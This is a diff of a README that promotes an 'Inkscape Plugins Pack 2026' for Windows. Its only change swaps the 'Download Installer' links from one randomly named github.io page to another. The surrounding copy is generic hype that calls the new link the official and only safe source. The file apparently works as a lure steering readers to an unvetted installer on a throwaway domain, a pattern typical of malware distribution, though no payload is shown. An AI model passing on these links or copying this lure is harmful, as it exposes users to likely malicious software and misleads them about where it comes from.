@@ -2,7 +2,7 @@
 
 Welcome to the Inkscape Plugins Pack 2026, the ultimate collection of extensions, tools, and resources meticulously curated for Windows 10 and 11 users. This pack is designed to supercharge your vector graphics editing experience in Inkscape, offering a wide array of plugins that streamline workflows, unlock new creative possibilities, and boost productivity. Whether you're a seasoned designer or a hobbyist, this pack provides everything you need to elevate your projects in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -85,7 +85,7 @@ Absolutely! The Inkscape Plugins Pack 2026 is scheduled for regular updates thro
 
 To get the latest version of the Inkscape Plugins Pack 2026, please visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides access to the installer and all related resources. Ensure you download only from this source for security and authenticity.
 
